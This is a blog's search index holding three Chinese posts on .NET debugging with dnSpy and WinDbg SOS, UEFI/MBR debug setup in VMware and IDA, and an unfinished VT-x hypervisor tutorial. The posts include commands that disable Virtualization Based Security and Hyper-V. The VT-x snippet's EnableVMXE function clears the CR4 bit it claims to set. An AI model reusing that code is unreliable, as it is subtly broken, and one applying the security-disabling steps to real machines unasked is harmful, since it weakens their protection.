<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>dotNet调试技巧</title>
      <link href="/dotNet%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/"/>
      <url>/dotNet%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/</url>
      
        <content type="html"><![CDATA[<p>介绍.NET平台下一些基础的调试技巧。</p><span id="more"></span><h1 id="dnspy-调试"><a href="#dnspy-调试" class="headerlink" title="dnspy 调试"></a>dnspy 调试</h1><h2 id="Module-Breakpoint"><a href="#Module-Breakpoint" class="headerlink" title="Module Breakpoint"></a>Module Breakpoint</h2><p><code>Module Breakpoint</code> 可以看作DLL断点，支持在程序集加载时断下。当新增程序集后，会在<code>Assembly Explorer</code>出现新加载在<strong>内存</strong>中的程序集。</p><p><img src="/./dotNet%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/image-20230601170151971-1685610113802-1.png" alt="image-20230601170151971"></p><h2 id="Class-Breakpoint"><a href="#Class-Breakpoint" class="headerlink" title="Class Breakpoint"></a>Class Breakpoint</h2><p>类断点，将整个类的所有方法全部下断点。</p><p><img src="/./dotNet%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/image-20230601170831306.png" alt="image-20230601170831306"></p><h2 id="Condition-Breakpoint-amp-amp-Log-BreakPoint"><a href="#Condition-Breakpoint-amp-amp-Log-BreakPoint" class="headerlink" title="Condition Breakpoint &amp;&amp; Log BreakPoint"></a>Condition Breakpoint &amp;&amp; Log BreakPoint</h2><p>输入框的内容可以为任意表达式，用<code>&#123;&#125;</code>描述表达式，如：</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">command = &#123;<span class="keyword">this</span>.command&#125;</span><br></pre></td></tr></table></figure><p><img src="/./dotNet%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/image-20230602153208454.png" alt="image-20230602153208454"></p><p>输出的内容在输出中中，可以使用文件函数将其记录在日志。</p><p><img src="/./dotNet%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/image-20230602153559594.png" alt="image-20230602153559594"></p><p>这个输入框还可以读取预定义的一些关键字。</p><p><img src="/./dotNet%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7/image-20230602171331115.png" alt="image-20230602171331115"></p><h2 id="入口点"><a href="#入口点" class="headerlink" title="入口点"></a>入口点</h2><p>除开入口点外，<code>&lt;Module&gt;.cctor</code>是模块的加载点。这是.NET程序的重点关注对象。</p><h2 id="禁用-NET程序集优化"><a href="#禁用-NET程序集优化" class="headerlink" title="禁用.NET程序集优化"></a>禁用.NET程序集优化</h2><p>当.NET程序集以调试器方式启动时，是默认关闭程序集优化的，但当以附加调试的情况调试时。</p><h1 id="Windbg-调试"><a href="#Windbg-调试" class="headerlink" title="Windbg 调试"></a>Windbg 调试</h1><p>使用Windbg 可以非常方便的进行混合模式的调试，可以理解为，Windbg作为<code>Native</code>代码调试器，加载了<code>.NET</code>调试的功能。</p><p>使用<code>.loadby sos clr</code> 加载托管调试。</p><p>在此之前，需要明白一些数据结构</p><p>.Net 数据结构的相互关系大致如下：</p><ul><li>每个 .Net 应用程序都运行在一个或多个应用程序域 (Domain) 中，每个应用程序域都是一个独立的执行环境，可以加载和卸载程序集。</li><li>每个应用程序域都有一个基类 BaseDomain，它包含一些公共的数据结构和方法，例如 LoaderHeaps、ClassLoader、InterfaceVTableMapMgr 等。</li><li>每个应用程序域都有一个 SystemDomain 的引用，SystemDomain 是一个单例类，它表示 CLR 的初始化状态和全局数据结构，例如 GlobalStringLiteralMap、HandleTable、GCHeap 等。</li><li>SystemDomain 包含一个 SharedDomain 的引用，SharedDomain 是一个单例类，它表示所有应用程序域共享的数据结构，例如共享的 LoaderHeaps、共享的程序集等。</li><li>每个应用程序域都有一个或多个程序集 (Assembly)，每个程序集都包含一组 IL 模块和元数据。每个程序集都有一个 ClassLoader 的实例，负责加载类型和方法。</li><li>每个类型 (EEClass) 都有一个方法表 (MethodTable)，表示该类型的所有方法和字段。方法表包含指向方法描述符 (MethodDescriptor) 的指针，方法描述符表示方法的元数据信息和实现地址。方法表还包含接口映射表 (Interface Map)，表示该类型实现的接口和对应的方法表槽位。</li><li>每个对象实例 (ObjectInstance) 都有一个指向其类型的方法表的指针。对象实例还包含其字段值和同步块索引 (SyncBlockIndex)，后者指向同步块条目 (SyncTableEntry)，用于支持线程同步和垃圾回收等功能。</li></ul><h2 id="已知类的代码定位"><a href="#已知类的代码定位" class="headerlink" title="已知类的代码定位"></a>已知类的代码定位</h2><p>对于已知类名，需要定位EEClass，对于完整的方法也可以使用这个命令。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!Name2EE DllName!ClassName</span><br></pre></td></tr></table></figure><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !Name2EE System.Management.Automation.dll!System.Management.Automation.PowerShell</span><br><span class="line">Module:      00007ff9b5791000</span><br><span class="line">Assembly:    System.Management.Automation.dll</span><br><span class="line">Token:       0000000002000342</span><br><span class="line">MethodTable: 00007ff9b734f870</span><br><span class="line">EEClass:     00007ff9b5c13980</span><br><span class="line">Name:        System.Management.Automation.PowerShell</span><br></pre></td></tr></table></figure><p>和：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !Name2EE mscorlib.dll!System.Threading.WaitHandle.WaitOne</span><br><span class="line">Module:      00007ffa0e721000</span><br><span class="line">Assembly:    mscorlib.dll</span><br><span class="line">Token:       0000000006003d68</span><br><span class="line">MethodDesc:  00007ffa0e908d98</span><br><span class="line">Name:        System.Threading.WaitHandle.WaitOne(Int32, Boolean)</span><br><span class="line">JITTED Code Address: 00007ffa0ece9c70</span><br><span class="line">-----------------------</span><br><span class="line">Token:       0000000006003d69</span><br><span class="line">MethodDesc:  00007ffa0e908da0</span><br><span class="line">Name:        System.Threading.WaitHandle.WaitOne(System.TimeSpan, Boolean)</span><br><span class="line">JITTED Code Address: 00007ffa0f57aed0</span><br><span class="line">-----------------------</span><br><span class="line">Token:       0000000006003d6a</span><br><span class="line">MethodDesc:  00007ffa0e908da8</span><br><span class="line">Name:        System.Threading.WaitHandle.WaitOne()</span><br><span class="line">JITTED Code Address: 00007ffa0ed0a040</span><br><span class="line">-----------------------</span><br><span class="line">Token:       0000000006003d6b</span><br><span class="line">MethodDesc:  00007ffa0e908db0</span><br><span class="line">Name:        System.Threading.WaitHandle.WaitOne(Int32)</span><br><span class="line">JITTED Code Address: 00007ffa0f57af30</span><br><span class="line">-----------------------</span><br><span class="line">Token:       0000000006003d6c</span><br><span class="line">MethodDesc:  00007ffa0e908db8</span><br><span class="line">Name:        System.Threading.WaitHandle.WaitOne(System.TimeSpan)</span><br><span class="line">JITTED Code Address: 00007ffa0f57af50</span><br><span class="line">-----------------------</span><br><span class="line">Token:       0000000006003d6d</span><br><span class="line">MethodDesc:  00007ffa0e908f50</span><br><span class="line">Name:        System.Threading.WaitHandle.WaitOne(Int64, Boolean)</span><br><span class="line">JITTED Code Address: 00007ffa0f57af70</span><br></pre></td></tr></table></figure><p>点击<code>EEClass</code>后，可以dump出这个类的属性</p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !DumpClass /d 00007ff9b5c13980</span><br><span class="line">Class Name:      System.Management.Automation.PowerShell</span><br><span class="line">mdToken:         0000000002000342</span><br><span class="line">File:            C:\WINDOWS\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll</span><br><span class="line">Parent Class:    00007ffa0e722f68</span><br><span class="line">Module:          00007ff9b5791000</span><br><span class="line">Method Table:    00007ff9b734f870</span><br><span class="line">Vtable Slots:    5</span><br><span class="line">Total Method Slots:  16</span><br><span class="line">Class Attributes:    100101  </span><br><span class="line">Transparency:        Critical</span><br><span class="line">NumInstanceFields:   25</span><br><span class="line">NumStaticFields:     0</span><br><span class="line">              MT    Field   Offset                 Type VT     Attr            Value Name</span><br><span class="line">00007ffa0e74b698  4000edb       c0       System.Boolean  1 instance           isGetCommandMetadataSpecialPipeline</span><br><span class="line">00007ff9b734f810  4000edc        8 ...omation.PSCommand  0 instance           psCommand</span><br><span class="line">00007ff9b59216b0  4000edd       10 ...ment.Automation]]  0 instance           extraCommands</span><br><span class="line">00007ffa0e74b698  4000ede       c1       System.Boolean  1 instance           runningExtraCommands</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>这其中有一个MT，MT是<code>Method Table</code>，是这个类的方法表：</p><p>使用<code>!DumpMT -MD MTPointer</code> 可以打印出该表中的所有MD（Method Descriptor）</p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !DumpMT -MD 00007ff9b734f870</span><br><span class="line">EEClass:         00007ff9b5c13980</span><br><span class="line">Module:          00007ff9b5791000</span><br><span class="line">Name:            System.Management.Automation.PowerShell</span><br><span class="line">mdToken:         0000000002000342</span><br><span class="line">File:            C:\WINDOWS\Microsoft.Net\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll</span><br><span class="line">BaseSize:        0xe8</span><br><span class="line">ComponentSize:   0x0</span><br><span class="line">Slots in VTable: 149</span><br><span class="line">Number of IFaces in IFaceMap: 1</span><br><span class="line">--------------------------------------</span><br><span class="line">MethodDesc Table</span><br><span class="line">           Entry       MethodDesc    JIT Name</span><br><span class="line">00007ff9b68e70f0 00007ff9b5d30600 PreJIT System.Management.Automation.PowerShell.get_Commands()</span><br><span class="line">00007ff9b6148e30 00007ff9b5d310a8 PreJIT System.Management.Automation.PowerShell.AsPSPowerShellPipeline()</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p><code>MethodDesc</code> 是非常重要的数据结构，直接点击MethodDesc，可以展示出该方法的IL代码地址，以及JIT后的地址。</p><p>Entry 即为方法的入口地址。</p><p>如：</p><p>这是直接<code>DumpMD</code>的结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !DumpMD  00007ff9b5d310a8</span><br><span class="line">Method Name:  System.Management.Automation.PowerShell.AsPSPowerShellPipeline()</span><br><span class="line">Class:        00007ff9b5c13980</span><br><span class="line">MethodTable:  00007ff9b734f870</span><br><span class="line">mdToken:      0000000006002eb6</span><br><span class="line">Module:       00007ff9b5791000</span><br><span class="line">IsJitted:     yes</span><br><span class="line">CodeAddr:     00007ff9b68ee220</span><br><span class="line">Transparency: Critical</span><br></pre></td></tr></table></figure><p>直接用这个地址使用命令<code>DumpIL</code>即可得到IL地址。<br>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !DumpIL  00007ff9b5d310a8</span><br><span class="line">ilAddr = 00007ff9b629dafc</span><br><span class="line">IL_0000: ldstr &quot;PS_PowerShellPipeline&quot;</span><br><span class="line">IL_0005: call System.Management.Automation.InternalMISerialize::CreateCimInstance</span><br><span class="line">IL_000a: stloc.0 </span><br><span class="line">IL_000b: ldstr &quot;InstanceId&quot;</span><br><span class="line">IL_0010: ldarg.0</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>对这个CodeAddr点击，这可以反汇编JIT的代码，使用<code>U</code>命令</p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !U /d 00007ff9b68ee220</span><br><span class="line">preJIT generated code</span><br><span class="line">System.Management.Automation.PowerShell.AsPSPowerShellPipeline()</span><br><span class="line">Begin 00007ff9b68ee220, size 442</span><br><span class="line">&gt;&gt;&gt; 00007ff9`b68ee220 55              push    rbp</span><br><span class="line">00007ff9`b68ee221 4156            push    r14</span><br><span class="line">00007ff9`b68ee223 57              push    rdi</span><br><span class="line">00007ff9`b68ee224 56              push    rsi</span><br><span class="line">00007ff9`b68ee225 53              push    rbx</span><br><span class="line">00007ff9`b68ee226 4883ec50        sub     rsp,50h</span><br><span class="line">00007ff9`b68ee22a 488d6c2470      lea     rbp,[rsp+70h]</span><br><span class="line">00007ff9`b68ee22f 488bf1          mov     rsi,rcx</span><br><span class="line">00007ff9`b68ee232 488d7dc0        lea     rdi,[rbp-40h]</span><br><span class="line">00007ff9`b68ee236 b908000000      mov     ecx,8</span><br><span class="line">00007ff9`b68ee23b 33c0            xor     eax,eax</span><br><span class="line">00007ff9`b68ee23d f3ab            rep stos dword ptr [rdi]</span><br><span class="line">00007ff9`b68ee23f 488bce          mov     rcx,rsi</span><br><span class="line">00007ff9`b68ee242 488965b0        mov     qword ptr [rbp-50h],rsp</span><br><span class="line">00007ff9`b68ee246 488bf1          mov     rsi,rcx</span><br><span class="line">00007ff9`b68ee249 488b0db8ac15ff  mov     rcx,qword ptr [System_Management_Automation_ni+0x2b8f08 (00007ff9`b5a48f08)] (MT: Microsoft.Management.Infrastructure.CimInstance)</span><br><span class="line">00007ff9`b68ee250 ff151a7072ff    call    qword ptr [System_Management_Automation_ni+0x885270 (00007ff9`b6015270)]</span><br><span class="line">......</span><br></pre></td></tr></table></figure><h2 id="托管代码的调用堆栈"><a href="#托管代码的调用堆栈" class="headerlink" title="托管代码的调用堆栈"></a>托管代码的调用堆栈</h2><p>需要切换到托管线程，使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!clrstack</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!DumpStack</span><br></pre></td></tr></table></figure><p>这个可以获得非托管和托管线程的代码。</p><p>如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; !clrstack</span><br><span class="line">OS Thread Id: 0x36ec (0)</span><br><span class="line">        Child SP               IP Call Site</span><br><span class="line">000000a9266ed328 00007ffa36a64704 [HelperMethodFrame_1OBJ: 000000a9266ed328] System.Threading.WaitHandle.WaitOneNative(System.Runtime.InteropServices.SafeHandle, UInt32, Boolean, Boolean)</span><br><span class="line">000000a9266ed450 00007ffa0ece9ccc System.Threading.WaitHandle.InternalWaitOne(System.Runtime.InteropServices.SafeHandle, Int64, Boolean, Boolean)</span><br><span class="line">000000a9266ed480 00007ffa0ece9c9f System.Threading.WaitHandle.WaitOne(Int32, Boolean)</span><br></pre></td></tr></table></figure><h2 id="对象查看"><a href="#对象查看" class="headerlink" title="对象查看"></a>对象查看</h2><p>JIT的代码的调用规则和C代码编译的类似</p><p>rcx为<code>this</code>类，对应到该类，使用<code>!do &lt;class addr&gt; </code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:006&gt; !do 000001ece82fd368</span><br><span class="line">Name:        Microsoft.PowerShell.Commands.InvokeExpressionCommand</span><br><span class="line">MethodTable: 00007ff9dfe6b7d8</span><br><span class="line">EEClass:     00007ff9df3bcc58</span><br><span class="line">Size:        128(0x80) bytes</span><br><span class="line">File:        C:\WINDOWS\Microsoft.Net\assembly\GAC_MSIL\Microsoft.PowerShell.Commands.Utility\v4.0_3.0.0.0__31bf3856ad364e35\Microsoft.PowerShell.Commands.Utility.dll</span><br><span class="line">Fields:</span><br><span class="line">              MT    Field   Offset                 Type VT     Attr            Value Name</span><br><span class="line">00007ff9b71e9548  4002971        8 ...n.ICommandRuntime  0 instance 000001ece82fd458 commandRuntime</span><br></pre></td></tr></table></figure><p>点击value即可进一步Dump类中的属性</p>]]></content>
      
      
      
        <tags>
            
            <tag> dotNet </tag>
            
            <tag> Debug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UEFI+MBR调试踩坑合集</title>
      <link href="/UEFI-MBR%E8%B0%83%E8%AF%95%E8%B8%A9%E5%9D%91%E5%90%88%E9%9B%86/"/>
      <url>/UEFI-MBR%E8%B0%83%E8%AF%95%E8%B8%A9%E5%9D%91%E5%90%88%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<p>记录一下UEFI + MBR 相关环境搭建上踩过的坑。</p><span id="more"></span><h2 id="关闭Hyper-V"><a href="#关闭Hyper-V" class="headerlink" title="关闭Hyper-V"></a>关闭Hyper-V</h2><p>在最新的Windows环境上，可能需要关闭<code>Hyper-V</code>，才能在VMware的虚拟机配置-处理器-虚拟化引擎中选中<code>Intel VT-x/EPT</code></p><p>如果开启了Virtualization Based Security（基于虚拟化的安全性），请先关闭它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><p>再关闭<code>Hyper-V</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> hypervisorlaunchtype off</span><br></pre></td></tr></table></figure><p>如果只关闭Hyper-V，不关闭VBS，Hyper-V是关不掉的，我不知道为什么。</p><h2 id="Vmware-IDA-调试"><a href="#Vmware-IDA-调试" class="headerlink" title="Vmware + IDA 调试"></a>Vmware + IDA 调试</h2><p>请关闭<code>Hyper-V</code></p><p>配置以下参数到VMX里面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">debugStub.listen.guest32 = &quot;TRUE&quot;</span><br><span class="line">debugStub.hideBreakpoints = &quot;TRUE&quot;</span><br><span class="line">monitor.debugOnStartGuest32 = &quot;TRUE&quot;</span><br><span class="line">bios.bootDelay = &quot;10000&quot;</span><br></pre></td></tr></table></figure><p>使用ida的<code>IDA--&gt; Debugger--&gt; Attach--&gt; Remote GDB debugger</code></p><p>连接<code>127.0.0.1:8832</code>端口，启动虚拟机，之后在IDA弹出的窗口选择第一个。</p><p>按<code>alt+s</code>更改段为16位，给<code>0x7c00</code>下断点。</p><h2 id="EDK2-Windbg-调试"><a href="#EDK2-Windbg-调试" class="headerlink" title="EDK2 + Windbg 调试"></a>EDK2 + Windbg 调试</h2><p>因为目前的博客的介绍EDK2 + Windbg 调试的时间都在2020年，所以：</p><p>切换分支到<code>202002</code>的这个tag，回退版本到2020年。就可以支持Windbg + EDK2 的调试了。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 坑 </tag>
            
            <tag> 调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VT 技术学习</title>
      <link href="/VT-%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/"/>
      <url>/VT-%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>VT技术入门。</p><span id="more"></span><h3 id="0x00-VT-技术介绍"><a href="#0x00-VT-技术介绍" class="headerlink" title="0x00 VT 技术介绍"></a>0x00 VT 技术介绍</h3><h3 id="0x01-VT-环境搭建"><a href="#0x01-VT-环境搭建" class="headerlink" title="0x01 VT 环境搭建"></a>0x01 VT 环境搭建</h3><p>在最新的Windows环境上，可能需要关闭<code>Hyper-V</code>，才能在VMware的虚拟机配置-处理器-虚拟化引擎中选中<code>Intel VT-x/EPT</code></p><p>如果开启了Virtualization Based Security（基于虚拟化的安全性），请先关闭它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg ADD HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\DeviceGuard /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure><p>再关闭<code>Hyper-V</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> hypervisorlaunchtype off</span><br></pre></td></tr></table></figure><p>如果只关闭Hyper-V，不关闭VBS，Hyper-V是关不掉的。<br>如果还开启了UEFI 锁等复杂情况，就要参考微软文档了。</p><h3 id="0x02-总体流程"><a href="#0x02-总体流程" class="headerlink" title="0x02 总体流程"></a>0x02 总体流程</h3><h3 id="0x03-前置工作"><a href="#0x03-前置工作" class="headerlink" title="0x03 前置工作"></a>0x03 前置工作</h3><h4 id="CPUID"><a href="#CPUID" class="headerlink" title="CPUID"></a>CPUID</h4><p><code>eax = 1</code>执行<code>CPUID</code>，<code>ecx[5] = 1</code>则支持VT-x</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> ret[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line">__cpuid(ret, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// 检查是否支持VT</span></span><br><span class="line"><span class="keyword">if</span> (!(ret[<span class="number">2</span>] &amp; <span class="number">0x20</span>)) &#123; <span class="comment">// cpuid(1).ecx[5] == 1</span></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="msr"><a href="#msr" class="headerlink" title="msr"></a>msr</h4><p>检查VT-x是否在BIOS中被开启<br><code>msr[0x3a]</code>结果中的最低为为lock位，需要置1</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uint64_t</span> msr = __readmsr(<span class="number">0x3a</span>);</span><br><span class="line"><span class="keyword">if</span> (!(msr &amp; <span class="number">1</span>)) &#123; <span class="comment">//  msr[0x3a].lock == 1</span></span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="CR4"><a href="#CR4" class="headerlink" title="CR4"></a>CR4</h4><p><code>CR4</code>中的第13位<code>VMXE</code>置1打开启用<code>VMXE</code>指令扩展</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uintptr_t</span> cr4 = __readcr4();</span><br><span class="line"><span class="comment">// 检查VT-x 是否已经开启</span></span><br><span class="line"><span class="keyword">if</span> (cr4 &amp; <span class="number">0x2000</span>) &#123; <span class="comment">//cr4.VMXE == 0</span></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x04-VMXON"><a href="#0x04-VMXON" class="headerlink" title="0x04 VMXON"></a>0x04 VMXON</h3><h4 id="启用VMX扩展"><a href="#启用VMX扩展" class="headerlink" title="启用VMX扩展"></a>启用VMX扩展</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="keyword">inline</span> <span class="title function_">EnableVMXE</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">uint32_t</span> cr4 = __readcr4();</span><br><span class="line">cr4 &amp;= ~<span class="number">0x2000</span>;</span><br><span class="line">__writecr4(cr4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="分配VMXON-区域"><a href="#分配VMXON-区域" class="headerlink" title="分配VMXON 区域"></a>分配VMXON 区域</h4><p>直接分配4k即可</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PHYSICAL_ADDRESS HighAddress = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">g_cpu.pVMXONRegion = ExAllocatePoolWithTag(NonPagedPool, <span class="number">0x1000</span>, <span class="string">&#x27;vmon&#x27;</span>);</span><br><span class="line">g_cpu.pVMXONRegion_PA = MmGetPhysicalAddress(g_cpu.pVMXONRegion);</span><br><span class="line">RtlZeroMemory(g_cpu.pVMXONRegion, <span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure><h4 id="设置VMXON区域"><a href="#设置VMXON区域" class="headerlink" title="设置VMXON区域"></a>设置VMXON区域</h4><p>设置VMXON区域的四字节为msr[0x480]的低32位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">uintptr_t</span> msr = __readmsr(<span class="number">0x480</span>);</span><br><span class="line">*(ULONG*)(g_cpu.pVMXONRegion) = msr &amp; <span class="number">0xffffffff</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行<code>VMXON</code>指令，出错则CF位置1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push _high</span><br><span class="line">push _low</span><br><span class="line">vmxon dword ptr [esp]</span><br><span class="line">setc eax</span><br><span class="line">add esp,8</span><br></pre></td></tr></table></figure><h3 id="0x05-VMCS"><a href="#0x05-VMCS" class="headerlink" title="0x05  VMCS"></a>0x05  VMCS</h3><p>VMCS是<code>Virtual Machine Control Structure</code>，描述VM的一些属性。</p><p>首先需要初始化VMCS，再选中此VMCS。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 初始化虚拟机</span></span><br><span class="line">__vmx_vmclear(*(<span class="type">uint64_t</span>*)(&amp;g_cpu.pVMCSRegion_PA));</span><br><span class="line"><span class="comment">// 选中此虚拟机</span></span><br><span class="line">__vmx_vmptrld(*(<span class="type">uint64_t</span>*)(&amp;g_cpu.pVMCSRegion_PA));</span><br></pre></td></tr></table></figure><p>Intel 弄了一个标准的汇编指令来读写VMCS，<code>vmwrite/vmread</code>，不推荐直接修改内存。</p><p>VMCS域 包括以下三方面的内容：</p><p>1.宿主机执行域</p><p>2.虚拟机执行域</p><p>3.虚拟机执行控制域</p><p>3.1 VM 执行控制(<code>#VMExit</code> 事件设置)44</p><p>3.2 VM 退出控制(<code>#VMExit</code> 保存内容设置)</p><p>3.3 VM 